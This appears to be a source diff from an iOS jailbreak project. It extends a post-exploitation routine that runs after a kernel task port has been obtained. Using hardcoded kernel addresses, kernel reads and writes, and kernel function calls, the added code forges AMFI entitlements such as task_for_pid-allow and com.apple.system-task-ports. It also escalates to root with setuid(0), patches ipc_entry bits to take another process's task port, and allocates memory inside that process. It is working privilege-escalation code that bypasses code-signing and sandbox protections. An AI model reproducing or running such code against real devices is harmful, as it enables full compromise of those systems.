@@ -65,6 +65,14 @@ uint64_t kexecute(mach_port_t user_client, uint64_t fake_client, uint64_t addr, 
 	return returnval;
 }
 
+typedef struct
+{
+	uint64_t prev;
+	uint64_t next;
+	uint64_t start;
+	uint64_t end;
+} kmap_hdr_t;
+
 void let_the_fun_begin(mach_port_t tfp0, mach_port_t user_client) {
 	
 	init_kernel_utils(tfp0, user_client);
@@ -72,9 +80,23 @@ void let_the_fun_begin(mach_port_t tfp0, mach_port_t user_client) {
 	// Loads the kernel into the patch finder, which just fetches the kernel memory for patchfinder use
 	init_kernel(find_kernel_base(), NULL);
 	
+	
 	// Get the slide
 	uint64_t slide = find_kernel_base() - 0xFFFFFFF007004000;
 	printf("[fun] slide: 0x%016llx\n", slide);
+	
+	kmap_hdr_t kernel_map;
+	
+	kread(kread64(0xFFFFFFF0075D5E20+slide)+0x10, &kernel_map, sizeof(kernel_map));
+
+	uint64_t zm_tmp;
+#   define ZM_FIX_ADDR(addr) \
+( \
+zm_tmp = (kernel_map.start & 0xffffffff00000000) | ((addr) & 0xffffffff), \
+zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
+)
+	
+	
 	
 	// From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
 	uint64_t IOSurfaceRootUserClient_port = find_port_address(user_client, MACH_MSG_TYPE_MAKE_SEND); // UserClients are just mach_ports, so we find its address
@@ -136,8 +158,38 @@ void let_the_fun_begin(mach_port_t tfp0, mach_port_t user_client) {
 			our_proc = proc;
 		} else if (pid == 0) {
 			kern_proc = proc;
-		} else if (strstr(name, "containermanager")) {
+		} else if (strstr(name, "launchd")) {
 			container_proc = proc;
+			uint64_t mac_pol = kread64(kread64(proc+0x100)+0x78);
+			//				printf("MAC policies for this process are at %016llx\n", mac_pol);
+			uint64_t amfi_mac_pol = kread64(mac_pol+0x8); // This is actually an OSDictionary zz
+			//				printf("AMFI MAC policies at %016llx\n", amfi_mac_pol);
+			
+			uint64_t str = kalloc(strlen("get-task-allow")+1);
+			kwrite(str, "get-task-allow", strlen("get-task-allow"));
+			uint64_t bol = ZM_FIX_ADDR(kexecute(0xFFFFFFF0074A68C8+slide, 1, 0, 0, 0, 0, 0, 0));
+			kexecute(kread64(kread64(amfi_mac_pol)+8*31), amfi_mac_pol, str, bol, 0, 0, 0, 0);
+			
+			
+//			uint32_t f = kread32(amfi_mac_pol+20); // Number of items in the dictionary
+//			//				printf("%d\n", f);
+//
+//
+//			uint64_t g = kread64(amfi_mac_pol+32); // Item buffer
+//			//				printf("%016llx\n", g);
+//
+//			for (int i = 0; i < f; i++) {
+//				//					printf("%016llx\n", kread64(g+16*i)); // value is at this + 8
+//				printf("%016llx\n", kread64(kread64(g+16*i+8)));
+//				//					printf("%016llx\n", kread64(kread64(kread64(g+16*i)+0x10)));
+//
+//				size_t length = kexecute(0xFFFFFFF00709BDE0+slide, kread64(kread64(g+16*i)+0x10), 0, 0, 0, 0, 0, 0);
+//
+//				char* s = (char*)calloc(length+1, 1);
+//				kread(kread64(kread64(g+16*i)+0x10), s, length);
+//				printf("%s\n", s);
+//
+//			}
 		}
 		if (pid != 0) {
 			uint32_t csflags = kread32(proc + offsetof_p_csflags);
@@ -165,6 +217,9 @@ void let_the_fun_begin(mach_port_t tfp0, mach_port_t user_client) {
 	
 	// setuid(0) + test
 	{
+		
+		printf("[fun] our uid was %d\n", getuid());
+		
 		setuid(0);
 		
 		printf("[fun] our uid is %d\n", getuid());
@@ -291,38 +346,61 @@ void let_the_fun_begin(mach_port_t tfp0, mach_port_t user_client) {
 				
 				for (int i = 0; i < f; i++) {
 //					printf("%016llx\n", kread64(g+16*i)); // value is at this + 8
-//					printf("%016llx\n", kread64(kread64(g+16*i)+0x10));
+					printf("%016llx\n", kread64(kread64(g+16*i+8)));
 //					printf("%016llx\n", kread64(kread64(kread64(g+16*i)+0x10)));
 					
-//					size_t length = kexecute(0xFFFFFFF00709BDE0+slide, kread64(kread64(g+16*i)+0x10), 0, 0, 0, 0, 0, 0); strlen
+					size_t length = kexecute(0xFFFFFFF00709BDE0+slide, kread64(kread64(g+16*i)+0x10), 0, 0, 0, 0, 0, 0);
 					
-//					char* s = (char*)calloc(length+1, 1);
-//					kread(kread64(kread64(g+16*i)+0x10), s, length);
-//					printf("%s\n", s);
+					char* s = (char*)calloc(length+1, 1);
+					kread(kread64(kread64(g+16*i)+0x10), s, length);
+					printf("%s\n", s);
 					
 				}
-				kwrite64(kread64(kern_ucred+0x78)+0x8, amfi_mac_pol);
+				
 				printf("Gave us task_for_pid-allow\n");
 				
 				
 //
-//				uint64_t getObject = kread64(kread64(amfi_mac_pol)+304);
+				uint64_t str = kalloc(strlen("task_for_pid-allow")+1);
+				kwrite(str, "task_for_pid-allow", strlen("task_for_pid-allow"));
+				uint64_t getObject = kread64(kread64(amfi_mac_pol)+304);
+				uint64_t out = ZM_FIX_ADDR(kexecute(getObject, amfi_mac_pol, str, 0, 0, 0, 0, 0));
+				
+				printf("%08x\n", kread32(out+0xc));
+				
+//				printf("%016llx\n", kexecute(slide+0xFFFFFFF00707FB58, out, 0, 0, 0, 0, 0, 0));
 //
 //				KCALL(getObject, amfi_mac_pol, str, 0, 0, 0, 0, 0);
 //				uint64_t out = returnval;
-//				printf("%016llx\n", out);
+				printf("%016llx\n", out);
 //
 //				KCALL(slide+0xFFFFFFF00707FB58, out|0xfffffff000000000, 0, 0, 0, 0, 0, 0);
 //				printf("%016llx\n", returnval);
 //
 				
-//				uint64_t str = kalloc(strlen("task_for_pid-allow")+1);
-//				kwrite(str, "task_for_pid-allow", strlen("task_for_pid-allow"));
-//
-//				uint64_t bo = kalloc(8);
-//				kexecute(0xFFFFFFF00637D88C + slide, proc, str, bo, 0, 0, 0, 0);
-//				printf("hi - %016llx\n", kread64(bo));
+
+				uint64_t bo = kalloc(8);
+				kexecute(0xFFFFFFF00637D88C + slide, proc, str, bo, 0, 0, 0, 0);
+				printf("hi - %016llx\n", kread64(bo));
 				
+				uint64_t new_ent_dict = ZM_FIX_ADDR(kexecute(0xFFFFFFF0074AAD50+slide, 4, 0, 0, 0, 0, 0, 0)); // OSDictionary::withCapacity
+				printf("new_ent_dict - %016llx\n", kread64(new_ent_dict));
+				
+				uint64_t symbol = ZM_FIX_ADDR(kexecute(0xFFFFFFF0074C2D90+slide, str, 0, 0, 0, 0, 0, 0)); // OSSymbol::withCString
+				printf("symbol - %016llx\n", kread64(symbol));
+				
+				uint64_t bol = ZM_FIX_ADDR(kexecute(0xFFFFFFF0074A68C8+slide, 1, 0, 0, 0, 0, 0, 0)); // OSBoolean::withBoolean
+//																					 0x0000000012800000
+				printf("bol - %016llx\n", kread64(bol));
+				uint64_t bol2 = ZM_FIX_ADDR(kexecute(0xFFFFFFF0074A68C8+slide, 1, 0, 0, 0, 0, 0, 0));
+				
+				uint64_t str2 = kalloc(strlen("com.apple.system-task-ports")+1);
+				kwrite(str2, "com.apple.system-task-ports", strlen("com.apple.system-task-ports"));
+				
+				
+				kexecute(kread64(kread64(new_ent_dict)+8*31), new_ent_dict, str, bol, 0, 0, 0, 0);
+				kexecute(kread64(kread64(new_ent_dict)+8*31), new_ent_dict, str2, bol2, 0, 0, 0, 0);
+				kwrite64(kread64(kern_ucred+0x78)+0x8, amfi_mac_pol);
 				
 				break;
 			}
@@ -333,7 +411,64 @@ void let_the_fun_begin(mach_port_t tfp0, mach_port_t user_client) {
 	waitpid(pd, NULL, 0);
 	
 	pt = 0;
-	printf("getting Springboards task: %s\n", mach_error_string(task_for_pid(mach_task_self(), 55, &pt)));
+	task_t sb = 0;
+	printf("getting Springboards task: %s\n", mach_error_string(task_for_pid(mach_task_self(), 1, &sb)));
+	printf("sb task: %016llx\n", sb);
+	printf("my task: %016llx\n", mach_task_self());
+	
+	
+//	printf("%016llx\n", find_port_address(sb, MACH_MSG_TYPE_MAKE_SEND));
+//	mach_port_t sb_port = kexecute(0xFFFFFFF0070C7C88+slide, find_port_address(sb, MACH_MSG_TYPE_MAKE_SEND), 0, 0, 0, 0, 0, 0)|0xfffffff100000000;
+//	printf("sb_port potentially at %016llx - %016llx\n", sb_port, kread64(sb_port));
+	
+	uint64_t task_port_addr = task_self_addr();
+	uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+	uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
+	uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
+
+	uint32_t port_index = sb >> 8;
+	const int sizeof_ipc_entry_t = 0x18;
+	uint32_t bits = rk32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
+
+	printf("%d\n", bits);
+
+#define IE_BITS_SEND (1<<16)
+#define IE_BITS_RECEIVE (1<<17)
+
+	bits &= (~IE_BITS_RECEIVE);
+	bits |= IE_BITS_SEND;
+
+	wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
+//
+//	sb = find_port_address(sb, MACH_MSG_TYPE_MAKE_SEND);
+//
+//	uint64_t struct_task = rk64(sb + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+//
+//	while (struct_task != 0) {
+//		uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+//
+//		uint32_t pid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
+//
+//		if (pid == 55) {
+//			sb = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
+//
+//			printf("Found SB vmap! - %016llx\n", sb);
+//			break;
+//		}
+//
+//		struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
+//	}
+	
+//	uint32_t pid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
+//
+//	if (pid == 0) {
+//		uint64_t vm_map = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
+	
+	
+	
+	mach_vm_address_t address = 0;
+	kern_return_t kr = mach_vm_allocate(sb, (mach_vm_address_t *)&address, 0x10, VM_FLAGS_ANYWHERE);
+	printf("%d - %s\n", kr, mach_error_string(kr));
 	
 	
 	// zzz AMFI sucks..
@@ -371,6 +506,10 @@ void let_the_fun_begin(mach_port_t tfp0, mach_port_t user_client) {
 	 */
 	
 	// Cleanup
+	
+//	char *nmz = strdup("/dev/disk0s1s1");
+//	rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
+//	printf("[fun] remounting: %d\n", rv);
 	
 	kwrite64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_addr);
 	kwrite64(kread64(kern_ucred+0x78)+0x8, 0);
